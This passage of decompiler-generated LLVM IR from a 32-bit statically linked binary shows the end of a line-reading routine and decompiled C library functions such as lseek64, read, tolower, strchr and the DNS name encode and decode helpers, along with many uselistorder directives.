dec_label_pc_8050887:                             ; preds = %dec_label_pc_8050837.preheader, %dec_label_pc_8050836, %dec_label_pc_80507e4, %dec_label_pc_805080b, %dec_label_pc_8050887.outer
  %v0_8050887 = load i32, i32* @edx, align 4
  %v3_8050891 = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_8050887)
  store i32 %v3_8050891, i32* @eax, align 4
  %v1_8050899 = icmp eq i32 %v3_8050891, 0
  %v1_805089b = icmp eq i1 %v1_8050899, false
  br i1 %v1_805089b, label %dec_label_pc_8050788, label %dec_label_pc_80508a1

dec_label_pc_80508a1:                             ; preds = %dec_label_pc_8050887, %dec_label_pc_8050736
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_8050736 ], [ %stack_var_-28.0.ph, %dec_label_pc_8050887 ]
  br i1 %v12_8050626, label %dec_label_pc_80508c1, label %dec_label_pc_80508a8

dec_label_pc_80508a8:                             ; preds = %dec_label_pc_80508a1
  %v1_80508af = inttoptr i32 %stack_var_4.0 to i16*
  %v2_80508af = call i32 @__GI_fclose(i16* %v1_80508af)
  store i32 %v2_80508af, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508c1

dec_label_pc_80508c1:                             ; preds = %dec_label_pc_80507f4, %dec_label_pc_8050611, %dec_label_pc_805061d, %dec_label_pc_805063b, %dec_label_pc_805064e, %dec_label_pc_805065a, %dec_label_pc_8050663, %dec_label_pc_805068d, %dec_label_pc_80508a1, %dec_label_pc_80508a8, %dec_label_pc_80506c3
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_80508a1 ], [ %stack_var_-28.1, %dec_label_pc_80508a8 ], [ %v2_80506d2, %dec_label_pc_80506c3 ], [ 34, %dec_label_pc_805068d ], [ 34, %dec_label_pc_8050663 ], [ 34, %dec_label_pc_805065a ], [ 34, %dec_label_pc_805064e ], [ 34, %dec_label_pc_805063b ], [ 34, %dec_label_pc_805061d ], [ 34, %dec_label_pc_8050611 ], [ %stack_var_-28.0.ph, %dec_label_pc_80507f4 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_80505fc, i32* @ebx, align 4
  store i32 %v0_80505fb, i32* @esi, align 4
  store i32 %v0_80505fa, i32* @edi, align 4
  store i32 %v0_80505f9, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v3_8050891, { 2, 3, 1, 0 }
  uselistorder i32 %v1_8050836, { 0, 2, 1 }
  uselistorder i32 %v1_80507e7, { 1, 0 }
  uselistorder i8 %v2_80507ab96, { 1, 2, 0 }
  uselistorder i8* %v1_80507ab95, { 1, 0 }
  uselistorder i32 %v0_80507ab49, { 1, 0 }
  uselistorder i32 %v2_80507d1, { 1, 0 }
  uselistorder i32 %v1_80507ca, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80507d4.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_80507bf, { 1, 0 }
  uselistorder i32 %v0_80507bf, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80507b1, { 1, 0 }
  uselistorder i8* %v2_805082a, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805066f, { 2, 1, 0, 3 }
  uselistorder i32 %v0_805064e, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805062b, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8050632, { 1, 0 }
  uselistorder i32 %v1_805060c, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 11, 13, 12, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 9, 0, 1, 14, 15, 16 }
  uselistorder i32 (i16*)* @__GI_fclose, { 4, 5, 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 0, 1, 4, 3, 2 }
  uselistorder i32 (i32, i8*, i32, i32)* @inet_pton, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_strcoll, { 3, 0, 1, 2 }
  uselistorder i32 5, { 11, 14, 15, 16, 0, 10, 4, 5, 13, 6, 17, 18, 7, 2, 3, 19, 12, 20, 21, 8, 1, 9 }
  uselistorder i32 -6, { 1, 0, 2 }
  uselistorder i8 32, { 17, 18, 19, 20, 21, 25, 0, 12, 26, 14, 15, 16, 13, 22, 27, 28, 23, 24, 1, 2, 3, 4, 5, 6, 9, 8, 7, 10, 11 }
  uselistorder i32* @global_var_8053720, { 0, 4, 2, 5, 1, 3, 6 }
  uselistorder i32 10, { 15, 0, 21, 22, 23, 24, 25, 26, 1, 10, 16, 2, 6, 27, 7, 8, 9, 17, 3, 13, 19, 20, 11, 28, 18, 4, 5, 12, 14 }
  uselistorder i32 12, { 40, 41, 42, 0, 43, 16, 24, 1, 44, 45, 21, 19, 6, 20, 7, 8, 9, 10, 11, 12, 13, 46, 87, 88, 89, 90, 91, 92, 93, 94, 2, 17, 18, 95, 96, 97, 102, 23, 25, 28, 39, 26, 27, 75, 76, 77, 78, 79, 80, 81, 67, 68, 69, 70, 71, 72, 73, 74, 29, 30, 31, 32, 33, 34, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 22, 66, 82, 83, 84, 85, 103, 98, 3, 4, 99, 100, 14, 15, 101, 5, 47, 48, 35, 36, 37, 38, 86 }
  uselistorder i32 80, { 0, 4, 5, 6, 7, 8, 9, 10, 1, 2, 3 }
  uselistorder i32 56, { 5, 15, 10, 0, 11, 12, 13, 14, 2, 7, 3, 8, 4, 1, 16, 9, 6 }
  uselistorder i32 44, { 3, 4, 5, 2, 0, 15, 16, 17, 7, 1, 11, 13, 12, 8, 9, 10, 14, 6 }
  uselistorder i32 36, { 4, 5, 6, 8, 9, 10, 11, 12, 13, 0, 14, 1, 2, 15, 7, 3, 16, 17, 18, 19, 20 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 9, 11, 12, 0, 7, 4, 1, 8, 5, 6, 13, 14, 15, 16, 3, 2, 10 }
  uselistorder i32 16, { 36, 35, 0, 37, 38, 11, 8, 39, 12, 40, 76, 77, 48, 49, 50, 51, 52, 53, 60, 54, 55, 56, 57, 58, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 41, 42, 43, 44, 78, 79, 80, 81, 82, 83, 84, 85, 105, 13, 14, 23, 17, 33, 24, 25, 27, 26, 109, 1, 28, 29, 30, 3, 2, 71, 5, 4, 72, 7, 6, 73, 74, 15, 110, 45, 46, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 18, 101, 102, 103, 104, 106, 107, 108, 47, 10, 9, 19, 31, 32, 16, 20, 34, 22, 21, 75 }
  uselistorder i32 8, { 61, 60, 62, 0, 1, 63, 64, 65, 66, 67, 68, 6, 69, 2, 13, 70, 71, 72, 73, 28, 74, 131, 31, 14, 15, 16, 17, 32, 18, 19, 33, 34, 20, 35, 21, 36, 37, 76, 132, 133, 134, 135, 136, 137, 30, 29, 138, 139, 140, 141, 161, 162, 163, 164, 25, 169, 26, 170, 27, 41, 22, 43, 46, 59, 44, 45, 122, 123, 124, 125, 126, 127, 128, 7, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 8, 47, 48, 49, 50, 51, 52, 53, 54, 83, 84, 85, 86, 87, 39, 9, 40, 10, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 38, 105, 106, 11, 107, 108, 109, 110, 12, 111, 129, 130, 3, 168, 142, 77, 78, 4, 5, 42, 143, 144, 145, 146, 148, 149, 150, 147, 151, 152, 153, 154, 23, 24, 155, 156, 157, 158, 159, 160, 165, 166, 167, 79, 80, 81, 82, 75, 55, 56, 57, 58 }
  uselistorder i32 -32, { 3, 0, 1, 2 }
  uselistorder i32 32, { 35, 0, 36, 37, 21, 23, 3, 32, 4, 5, 6, 7, 8, 42, 22, 43, 44, 45, 27, 28, 46, 59, 24, 31, 60, 61, 33, 34, 10, 9, 11, 12, 29, 13, 1, 40, 38, 39, 47, 48, 2, 49, 50, 51, 52, 53, 54, 55, 14, 56, 30, 57, 58, 41, 15, 16, 18, 17, 25, 26, 20, 19 }
  uselistorder i32 4, { 122, 123, 124, 118, 116, 117, 119, 120, 121, 0, 5, 125, 126, 127, 128, 129, 130, 131, 132, 133, 28, 49, 68, 69, 70, 29, 30, 31, 134, 44, 1, 83, 6, 7, 206, 207, 208, 209, 210, 211, 135, 136, 71, 245, 246, 247, 139, 140, 141, 142, 143, 144, 52, 145, 151, 152, 153, 55, 32, 154, 155, 156, 157, 33, 34, 35, 56, 36, 37, 57, 38, 158, 39, 159, 58, 40, 59, 60, 8, 146, 147, 61, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 50, 222, 248, 223, 249, 250, 252, 253, 257, 258, 259, 251, 45, 65, 260, 261, 262, 263, 264, 265, 9, 72, 73, 74, 75, 62, 84, 85, 86, 53, 110, 111, 112, 113, 76, 77, 78, 79, 80, 54, 10, 81, 82, 254, 255, 186, 195, 196, 197, 198, 199, 11, 187, 188, 189, 190, 191, 192, 193, 194, 184, 185, 87, 41, 88, 89, 90, 91, 92, 93, 94, 12, 96, 95, 160, 47, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 27, 181, 182, 48, 183, 13, 63, 200, 201, 46, 202, 203, 204, 205, 2, 14, 3, 256, 15, 97, 224, 16, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 42, 43, 66, 64, 242, 243, 244, 148, 149, 51, 150, 137, 138, 98, 17, 99, 18, 19, 20, 21, 100, 22, 101, 102, 103, 104, 105, 106, 4, 107, 23, 108, 109, 114, 24, 25, 115, 26, 266, 67 }
  uselistorder i32* @ebp, { 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 9, 10, 11, 12, 13, 14, 15, 2, 67, 68, 69, 74, 70, 71, 72, 73, 75, 158, 159, 76, 80, 91, 92, 122, 123, 124, 160, 161, 162, 163, 164, 192, 193, 16, 17, 18, 19, 20, 139, 140, 141, 142, 143, 21, 22, 125, 126, 127, 128, 129, 130, 131, 132, 137, 133, 134, 135, 136, 1, 138, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 4, 165, 166, 167, 168, 169, 86, 0, 87, 88, 89, 90, 81, 82, 83, 84, 85, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 3, 186, 6, 7, 8, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 187, 188, 189, 77, 78, 79, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 5, 48, 49, 50, 51, 155, 156, 157, 194, 195, 190, 191 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_80508c1, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8050887, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_805083d, { 1, 0 }
  uselistorder label %dec_label_pc_8050821, { 1, 0 }
  uselistorder label %dec_label_pc_80507e4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80507ab.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80507d1, { 1, 0 }
  uselistorder label %dec_label_pc_805079f, { 1, 0 }
  uselistorder label %dec_label_pc_8050887.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8050771, { 1, 0 }
  uselistorder label %dec_label_pc_8050736, { 1, 0 }
  uselistorder label %dec_label_pc_805068d, { 1, 0 }
  uselistorder label %dec_label_pc_805061d, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80508d2 = load i32, i32* @ebx, align 4
  store i32 %v0_80508d2, i32* %stack_var_-12, align 4
  %v2_80508da = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80508da, i32* %esi.global-to-local, align 4
  %v1_80508f4 = call i32 @int80_syscall(i32 140)
  store i32 %v1_80508f4, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_80508f4, -4095
  br i1 %tmp16, label %dec_label_pc_805090e, label %dec_label_pc_8050900

dec_label_pc_8050900:                             ; preds = %entry
  %v1_8050900 = call i32 @__errno_location(i32 %arg3)
  %v0_8050905 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050905 = sub i32 0, %v0_8050905
  %v2_8050907 = inttoptr i32 %v1_8050900 to i32*
  store i32 %v1_8050905, i32* %v2_8050907, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050912

dec_label_pc_805090e:                             ; preds = %entry
  %v1_805090e = icmp eq i32 %v1_80508f4, 0
  br i1 %v1_805090e, label %dec_label_pc_8050917, label %dec_label_pc_8050912

dec_label_pc_8050912:                             ; preds = %dec_label_pc_805090e, %dec_label_pc_8050900
  %v0_8050912 = phi i32 [ %v1_80508f4, %dec_label_pc_805090e ], [ -1, %dec_label_pc_8050900 ]
  %v1_8050914 = ashr i32 %v0_8050912, 31
  br label %dec_label_pc_805091f

dec_label_pc_8050917:                             ; preds = %dec_label_pc_805090e
  %v3_8050917 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_805091f

dec_label_pc_805091f:                             ; preds = %dec_label_pc_8050912, %dec_label_pc_8050917
  %v0_8050925 = phi i32 [ %v0_8050912, %dec_label_pc_8050912 ], [ %v3_8050917, %dec_label_pc_8050917 ]
  %storemerge = phi i32 [ %v1_8050914, %dec_label_pc_8050912 ], [ %tmp, %dec_label_pc_8050917 ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_8050922 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050922, i32* @ebx, align 4
  ret i32 %v0_8050925

; uselistorder directives
  uselistorder i32 %v1_80508f4, { 1, 2, 0, 3 }
  uselistorder i32 31, { 21, 13, 22, 0, 1, 19, 20, 23, 24, 11, 4, 5, 2, 3, 10, 17, 14, 15, 16, 8, 9, 6, 7, 12, 25, 26, 18 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_805091f, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050928 = load i32, i32* @edi, align 4
  store i32 %v0_8050928, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050938 = load i32, i32* @ebx, align 4
  %v4_8050940 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8050938, i32* @ebx, align 4
  store i32 %v4_8050940, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8050940, -4095
  br i1 %tmp, label %dec_label_pc_8050958, label %dec_label_pc_805094c

dec_label_pc_805094c:                             ; preds = %entry
  %v1_805094c = call i32 @__errno_location(i32 %v0_8050938)
  %v0_8050951 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050951 = sub i32 0, %v0_8050951
  %v2_8050953 = inttoptr i32 %v1_805094c to i32*
  store i32 %v1_8050951, i32* %v2_8050953, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050958

dec_label_pc_8050958:                             ; preds = %entry, %dec_label_pc_805094c
  %v0_8050959 = phi i32 [ %v4_8050940, %entry ], [ -1, %dec_label_pc_805094c ]
  %v2_805095c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805095c, i32* @edi, align 4
  ret i32 %v0_8050959

; uselistorder directives
  uselistorder i32 %v4_8050940, { 1, 0, 2 }
  uselistorder i32 %v0_8050938, { 1, 0 }
  uselistorder i32 (i32)* @__errno_location, { 46, 31, 23, 68, 67, 66, 45, 44, 30, 29, 43, 22, 42, 21, 39, 28, 27, 17, 16, 15, 14, 13, 34, 60, 12, 65, 11, 10, 9, 8, 64, 7, 6, 5, 38, 4, 33, 1, 0, 51, 50, 63, 62, 61, 59, 36, 35, 32, 26, 25, 24, 2, 41, 40, 18, 49, 48, 20, 3, 58, 19, 57, 56, 47, 37, 55, 54, 53, 52 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 30, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder label %dec_label_pc_8050958, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8050964 = add i32 %arg1, 128
  %v6_805096f = icmp ugt i32 %v1_8050964, 383
  br i1 %v6_805096f, label %dec_label_pc_805097a, label %dec_label_pc_8050971

dec_label_pc_8050971:                             ; preds = %entry
  %v0_8050971 = load i32, i32* bitcast (i32** @global_var_8053728.334 to i32*), align 8
  %v2_8050976 = mul i32 %arg1, 2
  %v3_8050976 = add i32 %v0_8050971, %v2_8050976
  %v4_8050976 = inttoptr i32 %v3_8050976 to i16*
  %v5_8050976 = load i16, i16* %v4_8050976, align 2
  %v6_8050976 = sext i16 %v5_8050976 to i32
  store i32 %v6_8050976, i32* @edx, align 4
  br label %dec_label_pc_805097a

dec_label_pc_805097a:                             ; preds = %entry, %dec_label_pc_8050971
  %v0_805097a = phi i32 [ %arg1, %entry ], [ %v6_8050976, %dec_label_pc_8050971 ]
  ret i32 %v0_805097a

; uselistorder directives
  uselistorder i32 65536, { 1, 0, 2, 3, 4, 6, 5, 8, 7, 10, 9, 12, 11, 13, 14, 15, 17, 19, 16, 18 }
  uselistorder i32 128, { 11, 7, 9, 3, 8, 4, 5, 10, 0, 6, 12, 13, 14, 15, 16, 2, 1, 17 }
  uselistorder label %dec_label_pc_805097a, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8050981 = ptrtoint i8* %arg1 to i32
  %v2_8050989 = mul i32 %arg2, 256
  %v3_8050989 = and i32 %v2_8050989, 65280
  %v4_8050989 = and i32 %arg2, -65281
  %v5_8050989 = or i32 %v3_8050989, %v4_8050989
  %v8_805098b.pre = load i1, i1* @df, align 1
  %v9_805098b = select i1 %v8_805098b.pre, i32 -1, i32 1
  br label %dec_label_pc_805098b

dec_label_pc_805098b:                             ; preds = %dec_label_pc_8050990, %entry
  %v4_805098b = phi i32 [ %v6_805098b, %dec_label_pc_8050990 ], [ %v5_8050989, %entry ]
  %v7_805098b = phi i32 [ %v10_805098b, %dec_label_pc_8050990 ], [ %v4_8050981, %entry ]
  %v1_805098b = inttoptr i32 %v7_805098b to i8*
  %v2_805098b = load i8, i8* %v1_805098b, align 1
  %v10_805098b = add i32 %v7_805098b, %v9_805098b
  %v3_805098c = udiv i32 %v4_805098b, 256
  %v4_805098c = trunc i32 %v3_805098c to i8
  %v16_805098c = icmp eq i8 %v2_805098b, %v4_805098c
  br i1 %v16_805098c, label %dec_label_pc_8050999, label %dec_label_pc_8050990

dec_label_pc_8050990:                             ; preds = %dec_label_pc_805098b
  %v3_805098b = zext i8 %v2_805098b to i32
  %v5_805098b = and i32 %v4_805098b, -256
  %v6_805098b = or i32 %v3_805098b, %v5_805098b
  %v4_8050990 = icmp eq i8 %v2_805098b, 0
  %v1_8050992 = icmp eq i1 %v4_8050990, false
  br i1 %v1_8050992, label %dec_label_pc_805098b, label %dec_label_pc_8050994

dec_label_pc_8050994:                             ; preds = %dec_label_pc_8050990
  br label %dec_label_pc_8050999

dec_label_pc_8050999:                             ; preds = %dec_label_pc_805098b, %dec_label_pc_8050994
  %v0_8050999 = phi i32 [ 1, %dec_label_pc_8050994 ], [ %v10_805098b, %dec_label_pc_805098b ]
  %v1_805099b = add i32 %v0_8050999, -1
  ret i32 %v1_805099b

; uselistorder directives
  uselistorder i8 %v2_805098b, { 1, 2, 0 }
  uselistorder i32 %v4_805098b, { 1, 0 }
  uselistorder i32 -256, { 25, 1, 26, 0, 27, 10, 14, 28, 29, 3, 16, 15, 2, 30, 31, 6, 32, 4, 33, 5, 34, 38, 8, 18, 17, 7, 39, 40, 35, 41, 42, 43, 44, 45, 46, 11, 47, 48, 49, 59, 12, 23, 13, 60, 61, 22, 62, 36, 50, 51, 52, 53, 54, 55, 56, 9, 57, 58, 37, 19, 20, 21, 24 }
  uselistorder i1* @df, { 1, 5, 20, 21, 0, 2, 22, 23, 24, 13, 3, 28, 4, 26, 27, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 25 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050999, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80509a1 = load i32, i32* @edi, align 4
  %v0_80509a2 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_80509a9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80509a9, i32* @edi, align 4
  %v1_8050a085 = icmp eq i8* %arg1, null
  br i1 %v1_8050a085, label %dec_label_pc_8050a11, label %dec_label_pc_8050a0c.lr.ph

dec_label_pc_8050a0c.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8050a0c

dec_label_pc_80509af:                             ; preds = %dec_label_pc_8050a0c
  %v0_80509af = load i32, i32* @edx, align 4
  %v9_80509b4 = call i32 @__GI_strchr(i8* %v1_8050a0c, i32 46, i32 %v0_80509af, i32 %v0_80509af)
  %v1_80509bc = icmp eq i32 %v9_80509b4, 0
  br i1 %v1_80509bc, label %dec_label_pc_80509c8, label %dec_label_pc_80509c2

dec_label_pc_80509c2:                             ; preds = %dec_label_pc_80509af
  %v1_80509c4 = load i32, i32* @edi, align 4
  %v2_80509c4 = sub i32 %v9_80509b4, %v1_80509c4
  br label %dec_label_pc_80509d6

dec_label_pc_80509c8:                             ; preds = %dec_label_pc_80509af
  %v0_80509cb = load i32, i32* @edi, align 4
  %v5_80509cb = inttoptr i32 %v0_80509cb to i8*
  %v3_80509cc = call i32 @strlen(i8* %v5_80509cb)
  br label %dec_label_pc_80509d6

dec_label_pc_80509d6:                             ; preds = %dec_label_pc_80509c2, %dec_label_pc_80509c8
  %v0_80509e9 = phi i32 [ %v3_80509cc, %dec_label_pc_80509c8 ], [ %v2_80509c4, %dec_label_pc_80509c2 ]
  store i32 %v0_80509e9, i32* @esi, align 4
  %v1_80509d6 = icmp eq i32 %v0_80509e9, 0
  %v3_80509d6 = trunc i32 %v0_80509e9 to i8
  br i1 %v1_80509d6, label %dec_label_pc_8050a25, label %dec_label_pc_80509da

dec_label_pc_80509da:                             ; preds = %dec_label_pc_80509d6
  %v1_80509de = load i32, i32* %ebx.global-to-local, align 4
  %v2_80509de = sub i32 %arg3, %v1_80509de
  %v1_80509e0 = add i32 %v2_80509de, -1
  %v7_80509e1 = icmp ult i32 %v0_80509e9, %v1_80509e0
  %v1_80509e3 = icmp eq i1 %v7_80509e1, false
  br i1 %v1_80509e3, label %dec_label_pc_8050a25, label %dec_label_pc_80509e5

dec_label_pc_80509e5:                             ; preds = %dec_label_pc_80509da
  store i32 %arg2, i32* @edx, align 4
  %v4_80509eb = add i32 %v1_80509de, %arg2
  %v5_80509eb = inttoptr i32 %v4_80509eb to i8*
  store i8 %v3_80509d6, i8* %v5_80509eb, align 1
  %v0_80509ee = load i32, i32* %ebx.global-to-local, align 4
  %v1_80509ee = add i32 %v0_80509ee, 1
  %v0_80509f0 = load i32, i32* @edx, align 4
  %v0_80509f2 = load i32, i32* @esi, align 4
  %v2_80509f3 = add i32 %v1_80509ee, %v0_80509f0
  %v0_80509f5 = load i32, i32* @edi, align 4
  %v2_80509f6 = add i32 %v0_80509f2, %v1_80509ee
  store i32 %v2_80509f6, i32* %ebx.global-to-local, align 4
  %tmp30 = inttoptr i32 %v2_80509f3 to i16*
  %v7_80509f9 = call i32 @memcpy(i16* %tmp30, i32 %v0_80509f5, i32 %v0_80509f2)
  %v1_8050a05 = add i32 %v9_80509b4, 1
  br i1 %v1_80509bc, label %dec_label_pc_8050a11, label %dec_label_pc_8050a08

dec_label_pc_8050a08:                             ; preds = %dec_label_pc_80509e5
  store i32 %v1_8050a05, i32* @edi, align 4
  %v1_8050a08 = icmp eq i32 %v1_8050a05, 0
  br i1 %v1_8050a08, label %dec_label_pc_8050a11, label %dec_label_pc_8050a0c

dec_label_pc_8050a0c:                             ; preds = %dec_label_pc_8050a0c.lr.ph, %dec_label_pc_8050a08
  %v0_80509b3 = phi i32 [ %v4_80509a9, %dec_label_pc_8050a0c.lr.ph ], [ %v1_8050a05, %dec_label_pc_8050a08 ]
  %v1_8050a0c = inttoptr i32 %v0_80509b3 to i8*
  %v2_8050a0c = load i8, i8* %v1_8050a0c, align 1
  %v3_8050a0c = icmp eq i8 %v2_8050a0c, 0
  %v1_8050a0f = icmp eq i1 %v3_8050a0c, false
  br i1 %v1_8050a0f, label %dec_label_pc_80509af, label %dec_label_pc_8050a11

dec_label_pc_8050a11:                             ; preds = %dec_label_pc_8050a08, %dec_label_pc_8050a0c, %dec_label_pc_80509e5, %entry
  %tmp31 = icmp slt i32 %arg3, 1
  br i1 %tmp31, label %dec_label_pc_8050a25, label %dec_label_pc_8050a18

dec_label_pc_8050a18:                             ; preds = %dec_label_pc_8050a11
  %v1_8050a1c = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050a1c = add i32 %v1_8050a1c, %arg2
  %v3_8050a1c = inttoptr i32 %v2_8050a1c to i8*
  store i8 0, i8* %v3_8050a1c, align 1
  %v0_8050a20 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050a20 = add i32 %v0_8050a20, 1
  br label %dec_label_pc_8050a28

dec_label_pc_8050a25:                             ; preds = %dec_label_pc_80509da, %dec_label_pc_80509d6, %dec_label_pc_8050a11
  br label %dec_label_pc_8050a28

dec_label_pc_8050a28:                             ; preds = %dec_label_pc_8050a18, %dec_label_pc_8050a25
  %storemerge3 = phi i32 [ %v1_8050a20, %dec_label_pc_8050a18 ], [ -1, %dec_label_pc_8050a25 ]
  store i32 %v0_80509a2, i32* @esi, align 4
  store i32 %v0_80509a1, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i8* %v1_8050a0c, { 1, 0 }
  uselistorder i32 %v1_8050a05, { 0, 2, 1 }
  uselistorder i32 %v0_80509f2, { 1, 0 }
  uselistorder i32 %v9_80509b4, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 5, 7, 6, 4, 3, 2, 1, 0, 8 }
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_strchr, { 0, 2, 1 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder i8* null, { 4, 3, 2, 7, 0, 1, 6, 8, 9, 5, 10 }
  uselistorder label %dec_label_pc_8050a28, { 1, 0 }
  uselistorder label %dec_label_pc_8050a25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050a11, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8050a0c, { 1, 0 }
  uselistorder label %dec_label_pc_80509d6, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8050a32 = load i32, i32* @esi, align 4
  %v4_8050a37 = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_8050a37, label %dec_label_pc_8050afe, label %dec_label_pc_8050a46

dec_label_pc_8050a46:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_8050ae62541 = add i32 %arg2, %arg1
  %v3_8050ae62642 = inttoptr i32 %v2_8050ae62541 to i8*
  %v4_8050ae62743 = load i8, i8* %v3_8050ae62642, align 1
  %v1_8050aea2945 = icmp eq i8 %v4_8050ae62743, 0
  %v1_8050aec3046 = icmp eq i1 %v1_8050aea2945, false
